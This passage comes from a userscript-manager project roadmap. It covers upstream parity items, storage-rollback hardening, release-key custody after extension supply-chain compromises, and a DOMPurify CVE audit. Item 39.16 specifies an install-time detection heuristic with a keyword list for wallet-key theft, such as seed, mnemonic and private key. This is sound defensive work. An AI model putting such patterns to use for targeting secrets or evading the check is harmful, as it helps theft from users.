- Source: [VM v2.37.0 changelog](https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.0).

**Status (2026-05-19):** ✅ Shipped. `GM_info.script.tags` was already the canonical plural array (shipped v3.9.0). Added a singular `tag` getter to both `background.core.js` and [`src/background/wrapper-builder.ts`](src/background/wrapper-builder.ts) using an object-literal getter (`get tag() { return Array.isArray(this.tags) ? this.tags[0] : undefined; }`) so legacy scripts written against pre-2026 Violentmonkey can read either form. Regression suite [`tests/wrapper-dom-security.test.js`](tests/wrapper-dom-security.test.js) added 2 cases verifying tags/tag round-trip + undefined-on-empty.

### 38.13 Pre-3.10.1 → post-3.10.1 hardening sweep (audit pass)

Between v3.10.1 (April 28, 2026) and the writing of this phase, 11 commits landed concentrated on storage / persistence rollback boundaries. They aren't tagged as a release yet but represent a coherent Phase-5/Phase-17 reinforcement worth recording so the next release notes can cite them by topic instead of by individual commit.

| Commit | Topic |
|--------|-------|
| `aca9e8c` | Clone storage write boundaries |
| `4f1e25e` | Isolate settings snapshots from cache |
| `a4c2c02` | Rollback settings cache on persist failure |
| `3b576c3` | Harden script value storage keys |
| `5d0d479` | Harden imported script ID handling |
| `d35fce7` | Preserve script IDs in runtime ZIP restores |
| `cdf17ae` | Harden factory reset storage cleanup |
| `f5f6640` | Rollback workspace activation state on save failure |
| `42e6a10` | Harden folder and workspace persistence rollback |
| `bf409f1` | Harden wrapper DOM and network hooks |
| `a1e89c9` | Harden userscript bridge and network fetches |

- Tag a v3.11.0 release for the next CWS submission grouping these under a single "Storage & persistence rollback hardening" line in CHANGELOG.
- Add a regression test pinning the rollback contract: every storage write that touches multiple keys atomically rolls back if any key fails (the v3.10.1 → HEAD work appears to enforce this end-to-end; lock it in with a test). ✅ Shipped 2026-05-19 — [`tests/storage.test.js`](tests/storage.test.js) `Phase 38.13 — multi-key rollback contract` suite adds 7 cases pinning: ScriptStorage.set cache-≡-persisted (update + insert), ScriptStorage.delete cross-key atomic restore (script + values), ScriptStorage.clear all-or-nothing restore across multiple value bags, ScriptValues.setAll batch atomicity, FolderStorage.update field preservation, SettingsManager.set cache revert, and invalidateMatchSet suppression on rollback.
- No external source — internal hardening pass, captured for completeness.

**Exit criteria:** `GM_addElement` returns `null` on failure with a regression test; dashboard search accepts `re:` regex prefix; update-check decoupled with tri-state setting (38.3 promoted); popup gets context-menu-script section; open-local-file + watch shipped end-to-end (Chrome path); `window.onurlchange` uses Navigation API where available; Hebrew locale + RTL smoke shipped; dashboard tabs match VM's "Settings | Update | Sync" labels; force-update click is check-only; `GM_info.script.tags` plural with `tag` alias; XHR listener leak fixed and pinned by memory test; v3.11.0 tagged with the storage-hardening commits called out in CHANGELOG.

---

## Round 11 — External Research (May 2026)

_Net-new sources since Round 10 (April 22, 2026 cutoff). Numbered 218–230 to extend the existing index._

### Source Index

**Upstream Manager Releases (post-Round-10)**
218. https://github.com/violentmonkey/violentmonkey/releases/tag/v2.37.0 — VM v2.37.0 (April 23, 2026): GM_addElement null-on-failure (#2500), @tag dashboard regression fix (#2499), parse HTML in content realm (#2498), GM_info.script.tags plural, lazy init safe copies, DB convert for old `@tag` scripts.
219. https://github.com/violentmonkey/violentmonkey/releases — VM v2.37.1 beta (April 30, 2026): dashboard tabs split into "Settings | Update | Sync"; check-update click no longer force-installs; classic English-first sort restored.
220. https://github.com/violentmonkey/violentmonkey/issues/2500 — GM_addElement contract issue.
221. https://www.tampermonkey.net/changelog.php — Tampermonkey 5.5.6234 (Jan 15 2026), 5.5.6235 (Feb 13 2026), 5.5.6236 (Apr 2 2026), 5.5.6237 (Apr 10 2026).
222. https://docs.scriptcat.org/en/docs/change/v1.4/ — ScriptCat v1.4 (2026): assistant system (CAT.agent.*), 11 built-in tools, MCP protocol, sub-agents, skill bundles, @unwrap, window.onurlchange via Navigation API, multi-platform script search engines.
223. https://docs.scriptcat.org/en/docs/change/beta-changelog/ — ScriptCat beta channel (rolling, May 2026).

**Platform & Standards (Round 11 net-new)**
224. https://modelcontextprotocol.io/specification — Model Context Protocol spec: tool-server JSON-RPC contract that ScriptCat v1.4 adopts.
225. https://developer.chrome.com/docs/web-platform/navigation-api — Navigation API (Chrome 102+): `navigation.addEventListener('navigate', ...)` for SPA URL change detection without polling.
226. https://developer.mozilla.org/en-US/docs/Web/API/File_System_Access_API — File System Access API (Chrome 86+): `showOpenFilePicker` + `FileSystemFileHandle.getFile().lastModified` polling for the open-local-file + watch pattern.
227. https://developer.mozilla.org/en-US/docs/Web/API/FileSystemHandle/queryPermission — `queryPermission` / `requestPermission` on persisted file handles (handles survive SW restart but permission must be re-prompted).

**Community & Issue Tracker (Round 11)**
228. https://github.com/violentmonkey/violentmonkey/issues/2499 — VM dashboard wedge on `@tag`-installed scripts (resolved in v2.37.0; gives ScriptVault a regression target if any future `@tag` parser change introduces the same shape of bug).
229. https://github.com/violentmonkey/violentmonkey/issues/2498 — "Parse HTML in content realm" — relevant if/when ScriptVault revisits the GM_addElement / install-page rendering boundary; VM moved its HTML parsing into the content realm to avoid extension-realm DOM leakage.
230. https://chromiumdash.appspot.com/schedule — Chrome release schedule: confirms Chrome 149 stable target ≈ June 2026, Chrome 150 ≈ August 2026; no extension-API changes flagged in the milestone trackers reviewed during Round 11.

### Round 11 — Items Rejected (with reasoning)

| Item | Why Rejected |
|------|--------------|
| ScriptCat-style hosted assistant UI | Requires user-supplied API key + chat surface + telemetry-prone tool calls; directly contradicts ScriptVault's local-first / zero-telemetry positioning. Captured as 38.10 Under Consideration with the MCP-only subset. |
| Sub-agent / skill marketplace (ScriptCat v1.4) | Distribution + curation problem disguised as a feature; requires moderation, hosting, abuse handling. Rejected for a local manager. |
| Multi-platform script search engine selector (ScriptCat v1.4) | ScriptVault's existing GreasyFork integration + planned OpenUserJS integration (Phase 16.7) cover the addressable demand without a settings-bloat dropdown. |
| TM Firefox proxy support in `GM_xmlhttpRequest` (5.5.6234) | Chrome MV3 doesn't expose per-request proxy controls to extensions; would require declarativeNetRequest rewrite per call, which is fragile. Re-evaluate when Chrome ships an equivalent API. |
| Pre-warmed extra editor commands for touch devices (TM 5.5.6236) | Monaco already exposes the underlying commands; ScriptVault's editor toolbar covers the common cases. Adding a touch-mode toggle is settings bloat for a desktop-first audience. |

### Round 11 — Promoted Tier Changes

- **Phase 17.3** (decouple update-check from auto-install): **Now → Now-priority-1**. TM shipped this Feb 2026; the gap is now load-bearing for retention.
- **Phase 14.6** (RTL groundwork): **Next → Now-deferred-on-translation**. Hebrew translation (38.7) is the trigger; CSS/layout work can land before strings.
- **Phase 36.10** (live local-`@require` reload): **Later → Next**. TM shipping an equivalent end-user feature in 5.5.6236 + the security review can be scoped to "localhost only, opt-in per script" makes the original deferral moot.

### Round 11 — Items Already Shipped (audit-only)

| Round 11 finding | ScriptVault status |
|------------------|--------------------|
| `GM_info.script.tags` plural | ✅ Shipped v3.9.0 (Phase 36.4); needs the singular `tag` getter alias added (38.12) |
| `@unwrap` directive (ScriptCat v1.4) | ✅ Shipped v3.2.1 (Phase 11.2) |
| Storage-write rollback / settings cache isolation | ✅ Shipped post-v3.10.1 commits (38.13); ship as v3.11.0 |

### Round 11 Completion Note

Net-new sources: 13 (218–230). All 13 either back a Phase 38 item, document a rejected feature with reasoning, or pin a calendar fact for forward planning. Cumulative source floor (>240 across Rounds 1–11) remains well above the 30–60 floor. No Round 11 item duplicates a Now/Next item from Rounds 1–10; cross-references to Phase 17.3, 14.6, and 36.10 are explicit promotions, not duplicates. Phase 38 added; phase summary table below updated with v3.11.0 milestone.

| Phase | Version | Milestone |
|-------|---------|-----------|
| 38    | v3.11.0 | Round 11 catch-up: GM_addElement contract, regex search, decoupled updates, open-local-file watch, Navigation API onurlchange, Hebrew/RTL, storage-hardening release |
| 39    | v3.12.0+ | Round 12 catch-up: supply-chain custody, CWS API v2, TM 5.5.0 + VM v2.37.x parity, GM revival deltas, Chrome 149 platform wins, dep upgrades |

---

## Phase 39 — Round 12 Catch-up (May 2026)

**Goal:** Track everything net-new between the Round 11 cutoff (early May 2026) and 2026-05-17 across: (a) supply-chain security incidents and CWS publisher-side deadlines, (b) Tampermonkey **5.5.0** (May 8 2026) and Violentmonkey **v2.37.1/v2.37.3-beta**, (c) Greasemonkey's surprise revival (May 12–15 2026 commits after a ~14-month quiet period — invalidates the "GM is dead" assumption baked into Rounds 1–11), (d) Chrome 149 platform deltas, (e) dependency major-version bumps with hard cutover dates, (f) new community signal from VM/TM issues opened in Q1–Q2 2026.

Sources cited inline; full URL index at end of phase. All items verified against existing Phases 0–38 to prevent duplication.

### Phase 39 progress snapshot (last updated 2026-05-24)

| Status | Items |
|---|---|
| ✅ Shipped (runtime JS + TS mirror) | **39.9** warm-neutral theme · **39.10** runtime user-scripts probe · **39.11** `@match-top`/`@exclude-top` (TS port + 12 regression tests, 2026-05-24) · **39.13** `GM_openInTab` blob URL re-routing (TS port + tests, 2026-05-24) · **39.22** CSP page-injection timeout-bound awaits (TS port, 2026-05-24) · **39.24** storage round-trip tests |
| ✅ Shipped (runtime JS only — TS mirror pending Phase 1.5 wave 5) | **39.16** crypto-scam install-time heuristic · **39.25** `@require` cache invalidation via orphan cleanup · **39.26** sync acknowledgment background handlers · **39.27** install-page incognito short-circuit · **39.28** `injectImmediately` for document-start · **39.29** omnibox keyword `sv` · **39.31** string-length clamps · **39.15** sortable exclude-list editor |
| ✅ Audit complete, no code needed | **39.4** locale-length lint (CI test added) · **39.18** `confirm()` audit · **39.19** sourceURL emission · **39.20** `@icon` fallback (pre-existing) · **39.21** clearInterval N/A by design · **39.23** cross-realm Symbol.iterator guards (already in popup/sidepanel) · **39.12** menu-command user-activation (platform limitation) · **39.14** same-origin XHR shortcut (deferred — breaks @connect enforcement) |
| ⚠️ Design doc scaffolded | **39.1** [release runbook](docs/release-runbook.md) · **39.2** [CWS API v2 cutover](docs/release-runbook.md) · **39.5** [`@require-provenance` Sigstore](docs/require-provenance-design.md) · **39.40** [MCP 2026 compliance](docs/mcp-2026-compliance.md) · **39.43** [WCAG 3 gap analysis](docs/wcag3-gap-analysis.md) · **Phase 33** [cross-browser WXT plan](docs/cross-browser-pipeline.md) |
| ⏳ Pending | 39.3, 39.6–39.8, 39.17, 39.30, 39.32–39.39, 39.41, 39.42, 39.45, 39.48, 39.49 |
| ✅ Cross-refs to other phases | 39.44 (URLPattern → 22.2 promoted) · 39.46 (WASM-CM → 32.1 deprio) · 39.47 (Notification Triggers → 11.11 dead-marked) |

The 2026-05-24 autonomous-loop pass paired with this update closed three
TS-mirror drift bugs (Phases 39.11, 39.13, 39.22) plus the Phase 40.5
wrapper-Map caps + Phase 40.14 eviction counters that were missing from
`src/background/wrapper-builder.ts`. See CHANGELOG.md § Unreleased.

This snapshot reflects the cumulative in-session work; the full sub-item bodies below carry detailed `Status (...)` notes where shipped, audited, or scaffolded.

### Supply Chain & Release-Pipeline Security

#### 39.1 CWS API Key Custody & Release-Pipeline OIDC

The **Shai-Hulud 2.0 / Mini Shai-Hulud** npm worm (Sep 2025, Nov 2025, attacker reactivated May 11 2026) compromised the **Trust Wallet** Chrome extension, draining ~$8.5M in cryptocurrency through a stolen CWS API key. The Cyberhaven OAuth-phishing campaign (Dec 2024) had already hit 36 extensions / 2.6M users via the same vector.

ScriptVault's current release pipeline (`publish.sh` + `.github/workflows/ci.yml`) stores long-lived CWS credentials in GitHub Actions secrets. Replace with:

- **GitHub Actions OIDC** federated to a GCP service account; CWS API token minted just-in-time per release.
- **Hardware-key MFA** required on the publisher Google account; document in a new `SECURITY.md` "Release Custody" section.
- **Quarterly key rotation runbook** with the next-rotation date checked into `docs/release-runbook.md`.
- **Audit log:** every publish writes a signed receipt to a private GitHub repo; rejected if no OIDC chain.

Sources: [Microsoft Security Blog — Shai-Hulud 2.0 (Dec 9 2025)](https://www.microsoft.com/en-us/security/blog/2025/12/09/shai-hulud-2-0-guidance-for-detecting-investigating-and-defending-against-the-supply-chain-attack/), [Trust Wallet Chrome extension hack (The Hacker News)](https://thehackernews.com/2025/12/trust-wallet-chrome-extension-hack.html), [Cyberhaven OAuth phishing (Sekoia)](https://blog.sekoia.io/targeted-supply-chain-attack-against-chrome-browser-extensions/).

**Status (2026-05-17):** ⚠️ Design doc scaffolded — implementation pending. See [`docs/release-runbook.md`](docs/release-runbook.md) for the full custody model: hardware-key MFA on the publisher account, GCP Secret Manager + GitHub Actions OIDC for CWS API credentials, 90-day rotation cadence, audit-log requirements, and explicit prohibition of long-lived secrets in GitHub Actions. Tracks 39.1 + 39.2 + 39.4 + 39.49 in one runbook. Implementation gated on Phase 39.2's chrome-webstore-upload-cli 4.0 cutover.

#### 39.2 CWS API v2 Migration (Hard Deadline 2026-10-15)

The Chrome Web Store v1 publishing API sunsets **October 15, 2026**. After that, all programmatic uploads require API v2. ScriptVault's `publish.sh` uses `chrome-webstore-upload-cli`, which itself shipped a **4.0.0** breaking release (see 39.35) requiring Node 22+, env-only secrets, and removal of `--auto-publish`.

- Pin `chrome-webstore-upload-cli@^4`; migrate `--auto-publish` invocations to the new flow.
- Verify the publish dry-run against v2 endpoints before Oct 15.
- Document fallback: manual upload via CWS Developer Dashboard if the CLI breaks mid-cutover.
- Gate the cutover on Phase 39.1's OIDC plumbing landing first (the v2 API requires shorter-lived tokens).

Source: [CWS API v2 announcement](https://developer.chrome.com/blog/cws-api-v2).

**Status (2026-05-17):** ⚠️ Design doc scaffolded — implementation pending. Full migration sequence in [`docs/release-runbook.md`](docs/release-runbook.md) §3.

#### 39.3 Monaco DOMPurify CVE-2026-0540 Mitigation ✅ Audited — currently safe

[CVE-2026-0540](https://github.com/microsoft/monaco-editor/issues/5248) — DOMPurify XSS in versions 3.1.3–3.3.1 (fixed in 3.3.2). Monaco builds **0.54.0-dev-20250909 and later** transitively bundle the vulnerable range. ScriptVault is currently pinned to **0.52.0** (safe — verified `package-lock.json` resolves to 0.52.2 and the 0.52.x range never embedded the vulnerable DOMPurify) and Phase 13.4 plans the 0.55.x upgrade.

- Gate the Monaco bump on confirming the target build embeds DOMPurify ≥ 3.3.2 (verify via `npm ls dompurify` in the Monaco package).
- If not, vendor-patch DOMPurify in `lib/monaco/` after copy, or stay on 0.52.x until Monaco bumps its embed.
- Coordinate with **Phase 18.7** (`GM_setHTML` via Sanitizer API) — the native Sanitizer API path eliminates DOMPurify dependence in extension UI but not in Monaco's own innards.

**Status (2026-05-18, Round 13 audit):** ✅ Audit confirms no live exposure. `package-lock.json` line 2681 resolves `monaco-editor` to `0.52.2.tgz`. The 0.52.x range predates the DOMPurify dep bump (Monaco only started bundling DOMPurify in 0.54.0-dev), so we are not transitively vulnerable. Re-audit gate persists for any future 0.54.x+ bump. No code change required this round.

Source: [microsoft/monaco-editor #5248](https://github.com/microsoft/monaco-editor/issues/5248).

#### 39.4 CWS 75-Char Universal Name Limit Audit ✅ Audited + CI lint scaffolded

Chrome Web Store policy now enforces a **75-character cap** on the manifest `name` field across **all** locale translations. Submissions are rejected silently if any `_locales/<lang>/messages.json` `extName` exceeds the cap.

- Add a CI lint that fails the build if any locale's `extName` value > 75 chars.
- Audit current 8 locales (`de`, `en`, `es`, `fr`, `ja`, `pt`, `ru`, `zh`) plus the planned Phase 38.7 Hebrew (`he`).
- Document the cap in `CONTRIBUTING.md` so future locale PRs respect it.

**Status (2026-05-17):**
- ✅ **Audit complete:** all 8 current locales declare `extName = "ScriptVault"` (11 chars) and `extDescription` under 132 chars. No live violations.
- ✅ **CI lint shipped:** [`tests/manifest-locales.test.js`](tests/manifest-locales.test.js) pins `extName ≤ 75`, `extDescription ≤ 132`, and asserts all locales share the `en` key set (no orphaned/missing keys). Runs in the existing `npm test` Vitest pipeline; no CI config change required.
- ⏳ **CONTRIBUTING.md note pending** — small follow-up.

Source: [CWS program policies](https://developer.chrome.com/docs/webstore/program-policies).

#### 39.5 `@require-provenance` Sigstore-Style Verification (Concept)

**npm provenance is now GA via Sigstore** ([blog.sigstore.dev](https://blog.sigstore.dev/npm-provenance-ga/)). The same threat model that motivates npm provenance — CDN compromise serving silently-modified code — applies to userscripts' `@require` URLs. Phase 11.8 covers SRI hashes; this extends it.

- Define `// @require-provenance <sigstore-bundle-url>` directive parsed alongside `@require`.
- At install, fetch the provenance bundle, verify the Sigstore signature, and confirm the artifact hash matches the `@require` body.
- Reject install with a clear error if verification fails (`Provenance mismatch: @require body does not match signed artifact`).
- Document the publisher workflow: how an author signs a `@require` bundle with `cosign` or `npm publish --provenance`.
- Implementation is opt-in; absence of `@require-provenance` falls back to the existing SRI check.

Source: [Sigstore npm provenance GA](https://blog.sigstore.dev/npm-provenance-ga/), [Cosign signing docs](https://docs.sigstore.dev/cosign/signing/overview/).

**Status (2026-05-17):** ⚠️ Design doc scaffolded — implementation pending. Full design in [`docs/require-provenance-design.md`](docs/require-provenance-design.md): author signing workflow with `cosign sign-blob`, `@require-provenance` + `@require-identity` directives, verification flow using Web Crypto + bundled Fulcio root, six-stage implementation phases (parser → bundle fetcher → signature verify → Fulcio chain → Rekor inclusion proof → UI surface).

### Tampermonkey 5.5.0 + Violentmonkey v2.37.x Parity (May 2026)

#### 39.6 First-Run "Allow Userscript Injection" Permission Gate ⚠️ Deferred — redundant with Chrome 138 toggle

Tampermonkey **5.5.0 (May 8 2026)** requires users to grant a "special extension permission" before any script will inject. This is a trust-model shift beyond Chrome 138's per-extension toggle: the manager itself surfaces a one-time permission prompt and refuses injection until granted.

**Status (2026-05-19):** Deferred after evaluation. Chrome 138's `chrome.userScripts` per-extension toggle (already surfaced by Phase 39.10's runtime self-diagnosis banner) gates injection at the browser layer for new installs. Adding a second in-extension consent gate on top of the browser one creates redundant friction without a measurable security improvement — the user who installed ScriptVault and flipped the Chrome toggle has already given two layers of consent. TM 5.5.0's model is defensible for an enterprise-shipped product but works against ScriptVault's zero-friction-for-power-users positioning. Re-evaluate if CWS policy changes mandate a manager-side prompt.

If we revisit:

- Show a first-run modal in the dashboard: "ScriptVault is about to inject code into web pages. Allow?" with [Allow] / [Deny] / [Read more].
- Persist the user's choice in `chrome.storage.local`; deny short-circuits all `chrome.userScripts.register()` paths.
- "Read more" links to a plain-language explainer of the trust model (Phase 34.6 cognitive-a11y language).
- Subsequent script installs do not re-prompt; the grant is global.

Source: [TM changelog 5.5.0](https://www.tampermonkey.net/changelog.php).

#### 39.7 In-Page Context-Menu Commands via `chrome.contextMenus` ⚠️ Deferred — needs per-script settings UI

Violentmonkey **v2.37.3 beta (May 10 2026)** added an opt-in path that surfaces `GM_registerMenuCommand` entries in the page's native right-click menu via `chrome.contextMenus.create`. ScriptVault currently lists those commands only in the popup.

**Status (2026-05-19):** Deferred. The clean implementation requires a new per-script setting "Show menu commands in page context menu" (default off) plus the dashboard UI to toggle it — that surface lives in the 10K-line `pages/dashboard.js`. A half-implementation (global setting, all-or-nothing) would be UX-worse than no implementation because the user can't opt out of clutter for high-frequency scripts. Bundle this with the next dashboard-settings-UX pass.

- Add a per-script setting "Show menu commands in page context menu" (default off — opt-in to avoid context-menu clutter).
- On enable, register a `chrome.contextMenus.create({ contexts: ['page', 'selection'], documentUrlPatterns: [...] })` entry per command at registration time.
- Tear down on disable or uninstall (`chrome.contextMenus.remove`).
- Frame-aware: Phase 36.8 per-frame popup-menu grouping interacts; context-menu items must include frame ID so the right script handler fires.

Source: [VM v2.37.3 beta release notes](https://github.com/violentmonkey/violentmonkey/releases).

#### 39.8 OS-Policy Script Provisioning ✅ Shipped (Enterprise Extension to Phase 25)

TM 5.5.0 also added support for OS-policy-pushed userscripts: admins drop a `.user.js` file in a system-policy directory and TM auto-installs it on next browser launch. ScriptVault's Phase 25 covers enterprise admin policies for installing the extension itself; this extends Phase 25.2 (internal script repository) with a no-network path.

- Read from `chrome.storage.managed` for an array of script URLs (or inline `.user.js` bodies).
- Install/update on managed-storage change events.
- Flag managed scripts in the dashboard with a "managed by your organization" pill; users cannot disable, delete, or edit.
- Define a sample ExtensionSettings policy JSON template in `docs/enterprise-policy-sample.md`.

Source: [TM changelog 5.5.0](https://www.tampermonkey.net/changelog.php), [chrome.storage.managed reference](https://developer.chrome.com/docs/extensions/reference/api/storage#storage_areas).

#### 39.9 Warm Neutral Editor Theme ✅ Shipped

TM 5.5.0 ships a warm Monaco theme. Trivial parity item — add a JSON theme file under `lib/monaco/themes/` and an entry in the theme dropdown (Phase 7 dashboard themes already infrastructure).

**Status (2026-05-17):** Shipped. Warm-autumn palette (foreground `#e6d3b5`, keyword `#d97757`, comment `#8b7355`, cursor `#d97757`) defined in [`pages/editor-sandbox.html`](pages/editor-sandbox.html), mapped via the existing `mapTheme()` switchboard, and surfaced in the dashboard editor-theme dropdown ([`pages/dashboard.html`](pages/dashboard.html) editor-settings section). No new dependency; pure JSON theme definition.

Source: [TM changelog 5.5.0](https://www.tampermonkey.net/changelog.php).

#### 39.10 Runtime "Allow User Scripts" Self-Diagnosis (TM #2607) ✅ Shipped

TM issue [#2607](https://github.com/Tampermonkey/tampermonkey/issues/2607) (Nov 28 2025) documents recurring user confusion: Chrome 138+ replaced the global Developer Mode requirement with a per-extension "Allow User Scripts" toggle, but managers still show the legacy message. Phase 13.3 covers documentation; this is the **runtime probe**.

- On dashboard load and on `chrome.userScripts.register()` failure, probe `chrome.userScripts.execute()` with a no-op script.
- If it throws `NotAllowedError` / `chrome.userScripts.* not available`, surface a banner: _"ScriptVault needs the 'Allow User Scripts' toggle for this extension. [Open Extension Details]"_ that deep-links to `chrome://extensions/?id=<extension-id>`.
- Suppress the legacy "Developer mode required" message on Chrome ≥ 138.

**Status (2026-05-17):** Shipped. [`pages/dashboard.js`](pages/dashboard.js) `checkUserScriptsAvailability()` now classifies the probe outcome into three states (`ok` / `api-missing` / `not-allowed`) and tailors the banner copy + CTA per state. Chrome 138+ users see "ScriptVault needs the 'Allow User Scripts' toggle" with a one-click **Open Extension Details** deep-link to `chrome://extensions/?id=<extension-id>`. Pre-138 Chrome falls back to the existing Developer-mode guidance. Browsers without `chrome.userScripts` show "Browser unsupported" (no toggle link). The existing "How to Enable" modal path is preserved. [`pages/dashboard.html`](pages/dashboard.html) added the new direct-link button alongside the existing help button.

#### 39.11 `@exclude-top` / `@match-top` Top-Level-Origin Directives ✅ Shipped (TM #2784, extends Phase 26.5)

TM issue [#2784](https://github.com/Tampermonkey/tampermonkey/issues/2784) (May 13 2026) asks for exclusions based on `window.top.location.href` so iframe-injected scripts can be gated by the embedding page. Phase 26.5 covers frame-aware `@match`; this extends it to top-origin awareness.

- Parser: accept `@exclude-top <pattern>` and `@match-top <pattern>` as new directives.
- Wrapper-builder: before invoking the script, check `window.top?.location?.href` against the patterns; abort if `@exclude-top` matches or `@match-top` does not match.
- Cross-origin top frames return `undefined` via the same-origin policy — treat as "match" for `@exclude-top` (conservative — does not run when the top is opaque) and "no match" for `@match-top` (script only runs when top origin is provably the right one).
- Test coverage: same-origin top, cross-origin top (denied access), and direct top-level navigation cases.

Source: [TM #2784](https://github.com/Tampermonkey/tampermonkey/issues/2784).

#### 39.12 `GM_registerMenuCommand` User-Activation Preservation ⚠️ Audited — known platform limitation

TM issue [#2781](https://github.com/Tampermonkey/tampermonkey/issues/2781) (May 13 2026) — regression from TM 5.4.1 where menu-command callbacks lose user-activation, breaking `showOpenFilePicker()` and other gesture-gated APIs.

**Status (2026-05-19):** Audited. ScriptVault's dispatch path is `popup-click → chrome.tabs.sendMessage(content.js) → window.postMessage(page) → wrapper invokes callback`. Two `chrome.*` IPC hops consume the user activation by Chrome's platform rules (cross-process messaging never carries activation). This is a platform-wide limitation that affects every userscript manager using the same architecture — TM's #2781 fix narrows their own activation loss in synchronous-context-only cases, but does not solve it for popup-triggered commands.

The proposed `chrome.userScripts.execute({ world: 'MAIN' })` shortcut from the popup click also crosses a process boundary and loses activation; it's a partial workaround at best.

**Recommendation for authors:** Document in the GM API reference that menu-command callbacks invoked via the popup may not preserve user activation. Gesture-gated APIs (`showOpenFilePicker`, `requestStorageAccess`, transient activation-required postMessage targets) should be wired via direct `document.addEventListener('contextmenu', ...)` in the page instead.

No code change in this round; logging the audit so future rounds don't re-derive the analysis. Re-evaluate if Chrome ships a "preserve user activation across runtime messaging" platform API (none on the roadmap as of 2026-05).

Source: [TM #2781](https://github.com/Tampermonkey/tampermonkey/issues/2781).

#### 39.13 Blob URL Support in `GM_openInTab` ✅ Shipped (TM #2669)

TM issue [#2669](https://github.com/Tampermonkey/tampermonkey/issues/2669) — `GM_openInTab` cannot accept a `blob:` URL on Chrome because the URL is bound to the script's content world and dies when the tab navigates.

- On Blob-URL detection, the background SW fetches the Blob via the content script, re-creates it under the extension's origin, and opens **that** in the new tab.
- Document the limitation: cross-tab Blob sharing requires re-materializing under the extension origin, which means the user sees the URL as `blob:chrome-extension://...` rather than the original.
- Phase 16.6 covers Blob/File URL **download**; this is the in-tab open path.

Source: [TM #2669](https://github.com/Tampermonkey/tampermonkey/issues/2669).

#### 39.14 Same-Origin Shortcut in `GM_xmlhttpRequest` ⚠️ Researched, deferred (TM #2782)

**Status (2026-05-19):** Investigated and intentionally deferred. The proposed shortcut (skip the background round-trip for same-origin requests) would bypass three load-bearing invariants: `@connect` policy enforcement, the network log capture pipeline, and the `anonymous` cookie-isolation flag. The latency win (~5ms saved per same-origin call) doesn't justify silently breaking those invariants. A safer formulation would require auditing every callsite that depends on those side-effects — that work belongs in Phase 8 sync rewrite scope, not a single-session pickup. The original 39.14 entry stays here as a research-only record.

TM issue [#2782](https://github.com/Tampermonkey/tampermonkey/issues/2782) (May 13 2026) — `GM_xmlhttpRequest` returns 401 on a same-origin request that the page's own `fetch(..., {credentials: 'include'})` returns 200 for. The SW context doesn't inherit the page's session cookies.

- Detection: when target URL origin === current tab URL origin AND `anonymous !== true`, route via the **content-world `fetch()`** through a postMessage bridge instead of the SW.
- Forward the response back through the bridge with identical timing semantics (mock `onreadystatechange`).
- Edge case: SW must still own the response for non-same-origin or anonymous requests.
- This is a per-call routing decision, not a settings toggle.

Source: [TM #2782](https://github.com/Tampermonkey/tampermonkey/issues/2782).

#### 39.15 Sortable / Filterable Per-Script Exclude List Editor (TM #2780) ✅ Shipped (2026-05-19)

TM issue [#2780](https://github.com/Tampermonkey/tampermonkey/issues/2780) (May 11 2026) — when a script has 50+ `@exclude` patterns, the script-settings UI list is unordered and unfilterable. ScriptVault's pattern list has the same shape.

- Add a search/filter input above the include/exclude pattern lists in the script settings drawer.
- Drag-sort handles for reordering (Phase 14.5 covers the keyboard alternative).
- Sort options: alphabetical, by recency, by hit count (if matched-tab analytics from Phase 20.5 are populated).

Source: [TM #2780](https://github.com/Tampermonkey/tampermonkey/issues/2780).

**Status (2026-05-19):** ✅ Shipped (User @exclude editor only — User @match / Include get the same treatment when symmetry is requested). [`pages/dashboard.html`](pages/dashboard.html) `userExcludesList` group adds a `pattern-filter-input` (case-insensitive substring filter) and a `pattern-sort-btn` (A→Z toggle that re-orders DOM children alphabetically; clicking again restores insertion order from saved settings). Filter hides `.pattern-tag[hidden]` elements via CSS — the save path (`getUserPatternsFromList`) reads from the full DOM childList so filter visibility never affects persisted state. Sort button uses `aria-pressed` to track state and shows ↻ when sorted (click again to restore). Hit-count sort deferred (Phase 20.5 matched-tab analytics not yet populated). Drag-handle reorder deferred to Phase 14.5 keyboard-alternative work.

#### 39.16 Crypto-Scam Install-Time Heuristic ✅ Shipped (TM #2783)

TM issue [#2783](https://github.com/Tampermonkey/tampermonkey/issues/2783) (May 13 2026) — an active scam campaign distributes userscripts via Pastebin/Telegram that exfiltrate wallet keys. Phase 28.3 covers generic malware detection; this is a targeted install-time heuristic.

- On install, if the source URL host is **not** in `{greasyfork.org, openuserjs.org, github.com, gist.github.com}` AND the script body contains keywords from a curated allowlist (`wallet`, `swap`, `exchange`, `seed`, `mnemonic`, `private[\s_-]?key`, `metamask`, `trust\s?wallet`), surface a **modal warning** (not just a banner): _"This script accesses wallet/crypto-related APIs and is not from a known userscript repository. Are you certain you trust the author? [I understand the risk] / [Cancel]"_.
- Distinct from Phase 5.x AST analysis; this is a content-heuristic + source-heuristic gate stacked **on top of** the existing analysis pipeline.
- Track install-cancellation rate; if low, tighten the keyword list (false positives suggest the warning is dismissed without reading).

Source: [TM #2783](https://github.com/Tampermonkey/tampermonkey/issues/2783).

#### 39.17 Optional `monaco-vim` Keybindings ⏳ Track — bundle on demand

Recurring VM community request. Phase 15 covers the editor surface; `monaco-vim` is a ~50KB ESM module that adds Vim modal editing.

**Status (2026-05-19):** Tracked but not scheduled. ~50KB bundled lazy-load is acceptable but the feature is niche relative to other Phase 15 priorities (IntelliSense, version-history UI, snippet manager). Defer until a clean Settings → Editor pane lands so the toggle has a natural home.

- Bundle `monaco-vim` via esbuild; load on demand from a Settings → Editor → "Vim mode" toggle.
- Persist mode and Vim ex-command history in `chrome.storage.local`.
- Document that `monaco-vim` does NOT cover all Vim ex-commands; link to its README.

Source: [monaco-vim](https://github.com/brijeshb42/monaco-vim).

### Greasemonkey Revival Deltas (May 12–15 2026)

After a ~14-month quiet period, Greasemonkey maintainer arantius landed 6 commits between May 12–15 2026. The Rounds 1–11 baseline assumed "GM is dead"; that's now incorrect.

#### 39.18 `confirm()` → `<menuitem>` Audit (GM commit 4970340, May 15 2026) ✅ Audited

Greasemonkey replaced its `window.confirm()` dialog with a `<menuitem>` element. The pattern matters because **`window.confirm()` is blocked in MV3 service worker contexts** anyway — any code path that calls it from a non-page context silently does nothing.

- Grep ScriptVault for `window.confirm` / `confirm(` outside `pages/*.js` (dashboard, popup pages run in extension-page context where `confirm` works) — any hits in `background.core.js`, `bg/`, `modules/`, or `offscreen.js` are bugs.
- For confirmed bugs, replace with the existing `showConfirmModal` dashboard helper, or a `chrome.notifications.create` button-confirmation flow.

